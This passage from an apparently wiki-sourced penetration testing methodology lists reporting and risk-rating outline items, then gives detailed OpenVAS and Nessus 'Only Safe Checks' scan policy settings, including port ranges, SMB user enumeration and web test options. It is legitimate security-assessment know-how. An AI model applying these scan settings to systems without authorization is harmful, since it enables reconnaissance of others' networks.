<p>Ensure PoC code provides benign validation of the flaw</p>
</li>
<li>
<p>Reproducible Results</p>
</li>
<li>
<p>Test Cases</p>
</li>
<li>
<p>Fault triggers</p>
</li>
<li>
<p>Incident response and monitoring capabilities</p>
</li>
<li>
<p>Intelligence gathering</p>
</li>
<li>Reverse IDS</li>
<li>Pentest Metrics</li>
<li>Vuln. Analysis</li>
<li>Exploitation</li>
<li>Post-exploitation</li>
<li>
<p>Residual effects (notifications to<br>3<sup>rd</sup> parties, internally, LE, etc...)</p>
</li>
<li>
<p>Common elements</p>
</li>
<li>
<p>Methodology</p>
</li>
<li>Objective(s)</li>
<li>Scope</li>
<li>Summary of findings</li>
<li>Appendix with terms for risk rating</li>
</ol>
<h3 id="quantifying-the-risk">Quantifying the risk</h3>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ol>
<li>
<p>Evaluate incident frequency</p>
</li>
<li>
<p>probable event frequency</p>
</li>
<li>estimate threat capability<br>(from 3 - threat modeling)</li>
<li>Estimate controls strength (6)</li>
<li>Compound vulnerability (5)</li>
<li>Level of skill required</li>
<li>
<p>Level of access required</p>
</li>
<li>
<p>Estimate loss magnitude per incident</p>
</li>
<li>
<p>Primary loss</p>
</li>
<li>Secondary loss</li>
<li>Identify risk root cause analysis</li>
<li>Root Cause is never a patch</li>
<li>
<p>Identify Failed Processes</p>
</li>
<li>
<p>Derive Risk</p>
</li>
<li>
<p>Threat</p>
</li>
<li>Vulnerability</li>
<li>Overlap</li>
</ol>
<h3 id="deliverable">Deliverable</h3>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ol>
<li>
<p>Preliminary results</p>
</li>
<li>
<p>Review of the report with the customer</p>
</li>
<li>
<p>Adjustments to the report</p>
</li>
<li>
<p>Final report</p>
</li>
<li>
<p>Versioning of Draft and Final Reports</p>
</li>
<li>
<p>Presentation</p>
</li>
<li>
<p>Technical</p>
</li>
<li>
<p>Management Level</p>
</li>
<li>
<p>Workshop / Training</p>
</li>
<li>
<p>Gap Analysis (skills/training)</p>
</li>
<li>
<p>Exfiltarted evidence and any other raw (non-proprietary) data<br>gathered.</p>
</li>
<li>
<p>Remediation Roadmap</p>
</li>
<li>
<p>Triage</p>
</li>
<li>Maturity Model</li>
<li>Progression Roadmap</li>
<li>Long-term Solutions</li>
<li>Defining constraints</li>
</ol>
<h2 id="custom-tools-developed">Custom tools developed</h2>
<h1 id="appendix-a-creating-openvas-only-safe-checks-policy">Appendix A - Creating OpenVAS "Only Safe Checks" Policy</h1>
<p>In order to ensure that all tests are conducted with the same criteria, you will need to ensure that you have the correct OpenVAS Global Settings.  In order to do this you will need to connect to the OpenVAS Server and modifiy the Global Settings.  There are seven configuration tabs: General, Credentials, Target Selection, Access Rules, Prefs., and KB.  For our purposes, most of the default settings do not need to be modified.</p>
<h2 id="general">General</h2>
<p>The General tab is where we will set certain scan options.  The actual settings have been defined as indicated below:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''General Scan Options Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Port Range 
|1-65535</p>
<p>|-
|Consider unscanned ports as closed 
|Unchecked </p>
<p>|-
|Checks to perform concurrently 
|4</p>
<p>|-
|Path to CGIs
|/cgi-bin:/scripts</p>
<p>|-
|Do a reverse lookup of the IP before testing it
|Unchecked</p>
<p>|-
|Safe checks
|Checked</p>
<p>|-
|Designate hosts by their MAC address
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port Scanner Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|ike-scan (NASL wrapper) 
|Checked</p>
<p>|-
|Snmpwalk 'scanner' 
|Checked</p>
<p>|-
|SYN Scan
|Checked</p>
<p>|-
|Exclude toplevel domain wildcard hosts
|Unchecked</p>
<p>|-
|portbunny (NASL wrapper)
|Unchecked</p>
<p>|-
|strobe (NASL wrapper)
|Unchecked</p>
<p>|-
|Scan for LaBrea tarpitted hosts
|Checked</p>
<p>|-
|amap (NASL wrapper)
|Unchecked</p>
<p>|-
|pnscan (NASL wrapper)
|Unchecked</p>
<p>|-
|Netstat 'scanner'
|Unchecked</p>
<p>|-
|Simple TCP portscan in NASL
|Unchecked</p>
<p>|-
|OpenVAS TCP scanner
|Checked</p>
<p>|-
|Ping Host
|Checked</p>
<p>|-
|Nmap (NASL wrapper) 
|Checked</p>
<p>|}</p>
<h2 id="plugins">Plugins</h2>
<p>The Plugins tab, allows us to choose specific security checks by plugin family or individual checks that we want to enable.  The easiest way to set this is to select the "Enable All" button from the main Plugins tab, however this assumes the Safe Checks is selected from the General Tab.</p>
<h2 id="credentials">Credentials</h2>
<p>The Credentials tab, allows us to configure the Nessus scanner to use authentication credentials during scanning.  For our policy we will not edit any of the settings within this section.  They are however documented to ensure completeness.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''SMB Authorization'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|SMB login
|Blank</p>
<p>|-
|SMB password
|Blank</p>
<p>|-
|SMB domain (optional)
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SSH Authorization '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Per-host SSH key Selection (localhost)
|Select SSH Login</p>
<p>|-
|Per-host SSH key Selection (Default)
|Select SSH Login</p>
<p>|-
|User per-target login information
|Unchecked</p>
<p>|-
|SSH login name 
|sshovas</p>
<p>|-
|SSH password (unsafe!)
|Blank</p>
<p>|-
|SSH public key
|Blank</p>
<p>|-
|SSH private key
|Blank</p>
<p>|-
|SSH key passphrase<br />
|Blank</p>
<p>|}</p>
<h2 id="target-selection">Target Selection</h2>
<p>The Target Selection tab, allows us to specify specific targets or to read them from a file.  The main then to ensure that is checked is the Perform a DNS zone transfer.</p>
<h2 id="access-rules">Access Rules</h2>
<p>The Access Selection tab, allows us to view and manage the access rules for our scanner.  These rules determine which host you may scan.  Note that there are three kinds of access rules:</p>
<p>Server rules, Serverside user rules, and Clientside user rules.  Server rules are global to the server and will affect all users that connect to this server.  Serverside user rules are specific to a user and affect only this user, no matter from which client he connects to this server.  Finally, Clientside user rules are specific to the client.  They will affect only the scope in which they are defined.</p>
<h2 id="preferences">Preferences</h2>
<p>The Preferences tab allows for more granular control over scan settings.  All items in this category should be left alone.</p>
<h2 id="knowledge-base">Knowledge Base</h2>
<p>The configuration section for the Knowledge Base (KB) allows you to control the management of the server-side scan results.  Information retrieved by plugins is collected in a KB during a scan.  This is done on a per-host basis, meaning there is one KB for every host scanned.  The default is to discard the KB once all plugins have finished, but under certain circumstances it can be quite useful to tell the server to keep the KBs generated during the scan and use them again at a later time.</p>
<h1 id="appendix-b-creating-the-only-safe-checks-policy">Appendix B - Creating the "Only Safe Checks" Policy</h1>
<p>In order to ensure that all tests are conducted with the same criteria, you will need to ensure that you have created a policy called "Only Safe Checks."  In order to do this you will need to connect to the Nessus server UI, so that you can create a custom policy by clicking on the "Policies" option on the bar at the top and then "<nowiki>+</nowiki> Add" button on the right.  The "Add Policy" screen will be displayed as follows:</p>
<p>'''
[[:File:Penetration_Testing_Execution_162.png|Screenshot Here]]
'''</p>
<p>There are four configuration tabs: General, Credentials, Plugins, and Preferences.  For our purposes, most of the default settings do not need to be modified.</p>
<h2 id="general_1">General</h2>
<p>The General tab is where we will name and configure scan options related to our policy.  There are six boxes of grouped options that control scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port Scan Options, and Performance.</p>
<p>Basic allows us to define the policy itself.  The actual settings have been defined as indicated below:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Basic Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Name 
|Only Safe Checks</p>
<p>|-
|Visibility 
|Shared </p>
<p>|-
|Description 
|Complete scans not including Denial of Service.  </p>
<p>|-
|<u>'''Scan Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Save Knowledge Base 
|Checked</p>
<p>|-
|Safe Checks 
|Checked</p>
<p>|-
|Silent Dependencies 
|Checked</p>
<p>|-
|Log Scan Details to Server 
|Unchecked</p>
<p>|-
|Stop Host Scan on Disconnect 
|Unchecked</p>
<p>|-
|Avoid Sequential Scans 
|Unchecked</p>
<p>|-
|Consider Unscanned Ports as Closed 
|Unchecked</p>
<p>|-
|Designate Hosts by their DNS Name 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Network Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Reduce Parallel Connections on Congestion 
|Unchecked</p>
<p>|-
|Use Kernel Congestion Detection (Linux Only) 
|Unchecked </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port Scanners Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|TCP Scan 
|Checked</p>
<p>|-
|UDP Scan 
|Unchecked </p>
<p>|-
|SYN Scan
|Unchecked</p>
<p>|-
|SNMP Scan
|Checked</p>
<p>|-
|Netstat SSH Scan 
|Checked</p>
<p>|-
|Netstat WMI Scan 
|Checked</p>
<p>|-
|Ping Host 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port Scan Options Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Port Scan Range<br />
|1-65535</p>
<p>|-
|<u>'''Performance Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Max Checks Per Host (Windows) 
|5 </p>
<p>|-
|Max Checks Per Host (Linux) 
|50-75 </p>
<p>|-
|Max Hosts Per Scan 
|5</p>
<p>|-
|Network Receive Timeout (seconds) 
|5 </p>
<p>|-
|Max Simultaneous TCP Sessions Per Host 
|Unlimited </p>
<p>|-
|Max Simultaneous TCP Sessions Per Scan 
|Unlimited </p>
<p>|}</p>
<h2 id="credentials_1">Credentials</h2>
<p>The Credentials tab, allows us to configure the Nessus scanner to use authentication credentials during scanning.  For our policy we will not edit any of the settings within this section.  They are however documented to ensure completeness.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Windows credentials'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|SMB account
|Blank</p>
<p>|-
|SMB password
|Blank</p>
<p>|-
|SMB domain (optional)
|Blank</p>
<p>|-
|SMB password type
|Password</p>
<p>|-
|Additional SMB account (1)
|Blank</p>
<p>|-
|Additional SMB password (1)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(1)
|Blank</p>
<p>|-
|Additional SMB account (2)
|Blank</p>
<p>|-
|Additional SMB password (2)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(2)
|Blank</p>
<p>|-
|Additional SMB account (3)
|Blank</p>
<p>|-
|Additional SMB password (3)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(3)
|Blank</p>
<p>|-
|Never send SMB credentials in clear text
|Checked</p>
<p>|-
|Only use NTLMv2
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SSH Settings '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|SSH user name 
|root</p>
<p>|-
|SSH password (unsafe!)
|Blank</p>
<p>|-
|SSH public key to use
|Blank</p>
<p>|-
|SSH private key to use
|Blank</p>
<p>|-
|Passphrase for SSH key
|Blank</p>
<p>|-
|Elevate privileges with
|Nothing</p>
<p>|-
|su login
|Blank</p>
<p>|-
|Escalation password
|Blank</p>
<p>|-
|SSH known hosts file 
|Blank</p>
<p>|-
|Preferred SSH port
|22</p>
<p>|-
|Client version
|OpenSSH_5.0</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Kerberos configuration'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Kerberos Key Distribution Center (KDC) 
|Blank</p>
<p>|-
|Kerberos KDC Port
|88</p>
<p>|-
|Kerberos KDC Transport
|UDP</p>
<p>|-
|Kerberos Realm (SSH only)
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Cleartext protocols settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|User name
|Blank</p>
<p>|-
|Password (unsafe!)
|Blank</p>
<p>|-
|Try to perform patch level checks over telnet 
|Unchecked</p>
<p>|-
|Try to perform patch level checks over rsh
|Unchecked</p>
<p>|-
|Try to perform patch level checks over rexec
|Unchecked</p>
<p>|}</p>
<h2 id="plugins_1">Plugins</h2>
<p>The Plugins tab, allows us to choose specific security checks by plugin family or individual checks that we want to enable.  The easiest way to set this is to select the "Enable All" button from the main Plugins tab, however this assumes the Safe Checks is selected from the General Tab.</p>
<h2 id="preferences_1">Preferences</h2>
<p>The Preferences tab allows for more granular control over scan settings.  All items in this category should be.  The actual settings have been defined as indicated below:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Cisco IOS Compliance Checks'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Database Compliance Checks '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Database Settings '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Login 
|Blank </p>
<p>|-
|Password
|Blank</p>
<p>|-
|DB Type
|Oracle</p>
<p>|-
|Database SID
|Blank</p>
<p>|-
|Database port to use
|Blank</p>
<p>|-
|Oracle auth type
|NORMAL </p>
<p>|-
|SQL Server auth type
|Windows </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Do not scan fragile devices'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Scan Network Printers 
|Unchecked</p>
<p>|-
|Scan Novell Netware hosts 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Global variable settings'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Probe services on every port 
|Checked</p>
<p>|-
|Do not log in with user accounts not<br>specified in the policy
|Unchecked</p>
<p>|-
|Enable CGI scanning
|Checked</p>
<p>|-
|Network type
|Mixed (use RFC 1918) </p>
<p>|-
|Enable experimental scripts 
|Unchecked</p>
<p>|-
|Thorough tests (slow) 
|Unchecked</p>
<p>|-
|Report verbosity 
|Normal</p>
<p>|-
|Report paranoia 
|Normal</p>
<p>|-
|HTTP User-Agent 
|Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)</p>
<p>|-
|SSL certificate to use 
|Blank</p>
<p>|-
|SSL CA to trust 
|Blank</p>
<p>|-
|SSL key to use 
|Blank</p>
<p>|-
|SSL password for SSL key 
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''HTTP cookies import'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Cookies file
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''HTTP login page'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Login page 
|/</p>
<p>|-
|Login form 
|Blank</p>
<p>|-
|Login form fields 
|user#%USER%&amp;password#%PASS%</p>
<p>|-
|Login form method
|POST</p>
<p>|-
|Re-authenticate delay (seconds) 
|Blank</p>
<p>|-
|Check authentication on page 
|Blank</p>
<p>|-
|Follow 30x redirections (# of levels) 
|2 </p>
<p>|-
|Authenticated regex 
|Blank</p>
<p>|-
|Invert test (disconnected if regex matches) 
|Unchecked</p>
<p>|-
|Match regex on HTTP headers 
|Unchecked</p>
<p>|-
|Case insensitive regex 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''ICCP/COTP TSAP Addressing'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start COTP TSAP
|8</p>
<p>|-
|Stop COTP TSAP
|8</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Login configurations'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|HTTP account 
|Blank</p>
<p>|-
|HTTP password (sent in clear)
|Blank</p>
<p>|-
|NNTP account
|Blank</p>
<p>|-
|NNTP password (sent in clear)
|Blank</p>
<p>|-
|FTP account
|Anonymous</p>
<p>|-
|FTP password (sent in clear)
|&nbsp;</p>
<p>|-
|FTP writeable directory
|/incoming</p>
<p>|-
|POP2 account
|Blank</p>
<p>|-
|POP2 password (sent in clear)
|Blank</p>
<p>|-
|POP3 account
|Blank</p>
<p>|-
|POP3 password (sent in clear)
|Blank</p>
<p>|-
|IMAP account
|Blank</p>
<p>|-
|IMAP password (sent in clear)
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Modbus/TCP Coil Access'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start reg
|0</p>
<p>|-
|End reg
|16</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nessus SYN scanner'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Firewall detection
|Automatic (normal)</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nessus TCP scanner'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Firewall detection
|Automatic (normal)</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''News Server (NNTP) Information Disclosure'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|From address 
|Nessus <nowiki>&lt;</nowiki><a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#108;&#105;&#115;&#116;&#109;&#101;&#64;&#108;&#105;&#115;&#116;&#109;&#101;&#46;&#100;&#115;&#98;&#108;&#46;&#111;&#114;&#103;">&#108;&#105;&#115;&#116;&#109;&#101;&#64;&#108;&#105;&#115;&#116;&#109;&#101;&#46;&#100;&#115;&#98;&#108;&#46;&#111;&#114;&#103;</a><nowiki>&gt;</nowiki></p>
<p>|-
|Test group name regex 
|f<nowiki>[</nowiki>a-z<nowiki>]</nowiki>.tests? </p>
<p>|-
|Max crosspost 
|7 </p>
<p>|-
|Local distribution 
|Checked</p>
<p>|-
|No archive 
|Unchecked </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nikto (NASL wrapper)'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Enable Nikto
|Unchecked</p>
<p>|-
|Disable if server never replies 404
|Unchecked</p>
<p>|-
|Root directory
|Blank</p>
<p>|-
|Pause between tests (s)
|Blank</p>
<p>|-
|Scan CGI directories
|User supplied</p>
<p>|-
|Display: 1 Show redirects
|Unchecked</p>
<p>|-
|Display: 2 Show cookies received
|Unchecked</p>
<p>|-
|Display: 3 Show all 200/OK responses
|Unchecked</p>
<p>|-
|Display: 4 Show URLs which require authentication
|Unchecked</p>
<p>|-
|Display: V Verbose Output
|Unchecked</p>
<p>|-
|Tuning: 1 Interesting File/Seen in logs
|Unchecked</p>
<p>|-
|Tuning: 2 Misconfiguration / Default File
|Unchecked</p>
<p>|-
|Tuning: 3 Information Disclosure
|Unchecked</p>
<p>|-
|Tuning: 4 Injection (XSS/Script/HTML)
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Oracle Settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Oracle SID
|Blank</p>
<p>|-
|Test default accounts (slow)
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''PCI DSS Compliance'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Check for PCI-DSS compliance
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Ping the remote host'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|TCP ping destination port(s) 
|Built-in</p>
<p>|-
|Do an ARP ping
|Checked</p>
<p>|-
|Do a TCP ping
|Checked</p>
<p>|-
|Do an ICMP ping
|Checked</p>
<p>|-
|Number of Retries (ICMP)
|2</p>
<p>|-
|Do an applicative UDP ping (DNS, RPCÖ)
|Unchecked</p>
<p>|-
|Make the dead hosts appear in the report
|Unchecked</p>
<p>|-
|Log live hosts in the report
|Unchecked</p>
<p>|-
|Test the local Nessus host
|Checked</p>
<p>|-
|Fast network discovery
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port scanners settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Check open TCP ports found by local port enumerators
|Unchecked</p>
<p>|-
|Only run network port scanners if local port enumeration failed
|Checked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB Registry: Start the Registry Service during the scan'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start the Registry Service during the scan
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB Scope'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Request information about the domain
|Checked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB use domain SID to enumerate users'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start UID
|1000</p>
<p>|-
|End UID
|1200</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB use host SID to enumerate local users'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start UID
|1000</p>
<p>|-
|End UID
|1200</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMTP settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Third party domain
|Example.com</p>
<p>|-
|From address
|<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#110;&#111;&#98;&#111;&#100;&#121;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;">&#110;&#111;&#98;&#111;&#100;&#121;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;</a></p>
<p>|-
|To address
|postmaster@<nowiki>[</nowiki>AUTO_REPLACED_IP<nowiki>]</nowiki></p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SNMP settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Community name
|Public</p>
<p>|-
|UDP port
|161</p>
<p>|-
|SNMPv3 user name
|Blank</p>
<p>|-
|SNMPv3 authentication password
|Blank</p>
<p>|-
|SNMPv3 authentication algorithm
|MD5</p>
<p>|-
|SNMPv3 privacy password
|Blank</p>
<p>|-
|SNMPv3 privacy algorithm
|DES</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Service Detection'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Test SSL based services
|Known SSL ports</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Unix Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Web Application Tests Settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Enable web applications tests
|Unchecked</p>
<p>|-
|Maximum run time (min)
|60</p>
<p>|-
|Send POST requests
|Unchecked</p>
<p>|-
|Combinations of arguments values
|one value</p>
<p>|-
|HTTP Parameter Pollution
|Unchecked</p>
<p>|-
|Stop at first flaw
|Per port (quicker)</p>
<p>|-
|Test embedded web servers
|Unchecked</p>
<p>|-
|URL for Remote File Inclusion
|<a href="http://rfi.nessus.org/rfi.txt">http://rfi.nessus.org/rfi.txt</a></p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Web mirroring'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Number of pages to mirror
|1000</p>
<p>|-
|Maximum depth
|6</p>
<p>|-
|Start page
|/</p>
<p>|-
|Excluded items regex
|/server_privileges.php</p>
<p>|-
|Follow dynamic pages
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Windows Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Windows File Contents Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|}</p>
<h1 id="appendix-c-creating-the-only-safe-checks-web-policy">Appendix C - Creating the "Only Safe Checks (Web)" Policy</h1>
<p>In order to ensure that all tests are conducted with the same criteria, you will need to ensure that you have created a policy called "Only Safe Checks (Web)".  In order to do this you will need to connect to the Nessus server UI, so that you can create a custom policy by clicking on the "Policies" option on the bar at the top and then "<nowiki>+</nowiki> Add" button on the right.  The "Add Policy" screen will be displayed as follows:<br></p>
<p>[[:File:Penetration_Testing_Execution_163.png|Screenshot Here]]
<br>'''</p>
<p>There are four configuration tabs: General, Credentials, Plugins, and Preferences.  For our purposes, most of the default settings do not need to be modified.</p>
<h2 id="general_2">General</h2>
<p>The General tab is where we will name and configure scan options related to our policy.  There are six boxes of grouped options that control scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port Scan Options, and Performance.</p>
<p>Basic allows us to define the policy itself.  The actual settings have been defined as indicated below:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Basic Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Name 
|Only Safe Checks (Web)</p>
<p>|-
|Visibility 
|Shared </p>
<p>|-
|Description 
|Complete scans not including Denial of Service.  <br></p>
<p>|-
|<u>'''Scan Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Save Knowledge Base 
|Checked</p>
<p>|-
|Safe Checks 
|Checked</p>
<p>|-
|Silent Dependencies 
|Checked</p>
<p>|-
|Log Scan Details to Server 
|Unchecked</p>
<p>|-
|Stop Host Scan on Disconnect 
|Unchecked</p>
<p>|-
|Avoid Sequential Scans 
|Unchecked</p>
<p>|-
|Consider Unscanned Ports as Closed 
|Unchecked</p>
<p>|-
|Designate Hosts by their DNS Name 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Network Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Reduce Parallel Connections on Congestion 
|Unchecked</p>
<p>|-
|Use Kernel Congestion Detection (Linux Only) 
|Unchecked </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port Scanners Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|TCP Scan 
|Checked</p>
<p>|-
|UDP Scan 
|Unchecked </p>
<p>|-
|SYN Scan
|Unchecked</p>
<p>|-
|SNMP Scan
|Checked</p>
<p>|-
|Netstat SSH Scan 
|Checked</p>
<p>|-
|Netstat WMI Scan 
|Checked</p>
<p>|-
|Ping Host 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port Scan Options Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Port Scan Range<br />
|1-65535<br></p>
<p>|-
|<u>'''Performance Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Max Checks Per Host (Windows) 
|5 </p>
<p>|-
|Max Checks Per Host (Linux) 
|50-75 </p>
<p>|-
|Max Hosts Per Scan 
|5</p>
<p>|-
|Network Receive Timeout (seconds) 
|5 </p>
<p>|-
|Max Simultaneous TCP Sessions Per Host 
|Unlimited </p>
<p>|-
|Max Simultaneous TCP Sessions Per Scan 
|Unlimited </p>
<p>|}</p>
<h2 id="credentials_2">Credentials</h2>
<p>The Credentials tab, allows us to configure the Nessus scanner to use authentication credentials during scanning.  For our policy we will not edit any of the settings within this section.  They are however documented to ensure completeness.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Windows credentials'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|SMB account
|Blank</p>
<p>|-
|SMB password
|Blank</p>
<p>|-
|SMB domain (optional)
|Blank</p>
<p>|-
|SMB password type
|Password</p>
<p>|-
|Additional SMB account (1)
|Blank</p>
<p>|-
|Additional SMB password (1)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(1)
|Blank</p>
<p>|-
|Additional SMB account (2)
|Blank</p>
<p>|-
|Additional SMB password (2)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(2)
|Blank</p>
<p>|-
|Additional SMB account (3)
|Blank</p>
<p>|-
|Additional SMB password (3)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(3)
|Blank</p>
<p>|-
|Never send SMB credentials in clear text
|Checked</p>
<p>|-
|Only use NTLMv2
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SSH Settings '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|SSH user name 
|root</p>
<p>|-
